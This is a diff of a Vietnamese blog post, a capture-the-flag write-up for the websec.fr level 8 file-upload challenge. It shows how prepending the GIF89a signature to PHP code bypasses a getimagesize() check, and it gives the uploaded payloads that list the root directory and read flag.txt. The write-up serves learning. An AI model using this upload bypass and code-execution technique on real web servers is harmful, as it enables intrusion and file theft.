@@ -23,20 +23,20 @@
 <meta property="og:site_name" content="Khado">
 <meta property="og:description" content="https:&#x2F;&#x2F;websec.fr&#x2F;level08&#x2F;index.php  Gathering informationChallenge này liên quan đến kiến thức Upload File và GIF. GIF là gì?  GIF viết tắt của từ Graphics Interchange Format. Nôm na tiếng Việt gọi">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv2/homloi.png">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv2/folder.png">
-<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv2/no_kq.png">
-<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv2/debug.png">
-<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv2/1.png">
-<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv2/scandir.png">
-<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv2/flag.png">
+<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv8/homloi.png">
+<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv8/folder.png">
+<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv8/no_kq.png">
+<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv8/debug.png">
+<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv8/1.png">
+<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv8/scandir.png">
+<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv8/flag.png">
 <meta property="article:published_time" content="2022-08-07T04:19:52.000Z">
-<meta property="article:modified_time" content="2022-08-07T09:32:44.548Z">
+<meta property="article:modified_time" content="2022-08-07T09:42:02.694Z">
 <meta property="article:author" content="Khado">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="easy">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://dovankha.github.io/img/CTF/WebSec/lv2/homloi.png">
+<meta name="twitter:image" content="https://dovankha.github.io/img/CTF/WebSec/lv8/homloi.png">
   
   
   
@@ -300,38 +300,38 @@
 <li>File đó không được rỗng.</li>
 </ol>
 <p>Mình đã thử upload các file thông thường nhưng chưa vượt qua 3 điều kiện trên đó (có lẽ vì file GIF download từ Google về quá nặng).</p>
-<p><img src="/img/CTF/WebSec/lv2/homloi.png" srcset="/img/loading.gif" lazyload alt="Upload không thành công"></p>
+<p><img src="/img/CTF/WebSec/lv8/homloi.png" srcset="/img/loading.gif" lazyload alt="Upload không thành công"></p>
 <hr>
 <h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Trước khi đểể khai thác được bài này thì mình phải xác định là sẽ upload 1 file có chứa các dòng code PHP bên trong file đó (tạm gọi là shell PHP).</p>
 <p>Để ý hàm <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.getimagesize.php">getimagesize()</a> nó sẽ trả về giá trị khác <code>false</code> thì mới được.</p>
 <p>Cùng debug hàm <code>getimagesize()</code> này để xem cách hoạt động của nó ra sao?</p>
 <p>Mình sẽ chuẩn bị 2 file trong cùng một thư mục có tên là <code>1.php</code> và <code>getimagesize.php</code> với nội dung sau.</p>
-<p><img src="/img/CTF/WebSec/lv2/folder.png" srcset="/img/loading.gif" lazyload alt="Thư mục chứa files"></p>
+<p><img src="/img/CTF/WebSec/lv8/folder.png" srcset="/img/loading.gif" lazyload alt="Thư mục chứa files"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 1.php</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># getimagesize.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1.php&quot;</span>;<br><span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$info</span>,<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure>
 
 <p>Sau khi run file <code>getimagesize.php</code> thì kết quả sẽ không ra gì cả.</p>
-<p><img src="/CTF/WebSec/lv2/no_kq.png" srcset="/img/loading.gif" lazyload alt="Nothing"></p>
+<p><img src="/CTF/WebSec/lv8/no_kq.png" srcset="/img/loading.gif" lazyload alt="Nothing"></p>
 <p>Nhưng nếu mình thêm phần <code>Signature</code> của GIF vào file <code>1.php</code> thì sao?</p>
 <p><em>Mình có thể thêm trực tiếp Signature vào file. Hoặc dùng <a target="_blank" rel="noopener" href="https://hexed.it/">tool online</a></em></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 1.php</span><br>GIF89a <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>Run lại file <code>getimagesize.php</code>, thì đã ra được kết quả. Mặc dù là file <code>php</code> nhưng <code>mime-type</code> là <code>image/gif</code>.</p>
-<p><img src="/CTF/WebSec/lv2/debug.png" srcset="/img/loading.gif" lazyload alt="Nothing"></p>
+<p><img src="/CTF/WebSec/lv8/debug.png" srcset="/img/loading.gif" lazyload alt="Nothing"></p>
 <p>Mình có thể bypass qua vòng <code>if</code> thứ 2.</p>
 <p>Tiếp theo mình upload file lên xem server có xử lí không?</p>
-<p><img src="/CTF/WebSec/lv2/1.png" srcset="/img/loading.gif" lazyload alt="Upload file thành công"></p>
+<p><img src="/CTF/WebSec/lv8/1.png" srcset="/img/loading.gif" lazyload alt="Upload file thành công"></p>
 <p>Vậy là server có xử lí code trong file <code>1.php</code>. Việc tiếp theo mình xem trong thư mục hiện tại có những file nào?</p>
 <p>Mình đã thử các <a target="_blank" rel="noopener" href="https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/">webshell</a> PHP, tuy nhiên đã bị filter hay chặn gì đó nên không dùng được.</p>
 <p>Thay vì sửa code lại trong file <code>1.php</code> thì mình dùng Burp Suite để sửa code luôn cho nhanh.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>)); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/CTF/WebSec/lv2/scandir.png" srcset="/img/loading.gif" lazyload alt="Scandir"></p>
+<p><img src="/CTF/WebSec/lv8/scandir.png" srcset="/img/loading.gif" lazyload alt="Scandir"></p>
 <p>Đọc file <code>flag.txt</code> là xong. </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>)); <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/CTF/WebSec/lv2/flag.png" srcset="/img/loading.gif" lazyload alt="Got flag"></p>
+<p><img src="/CTF/WebSec/lv8/flag.png" srcset="/img/loading.gif" lazyload alt="Got flag"></p>
 
                 
               </div>
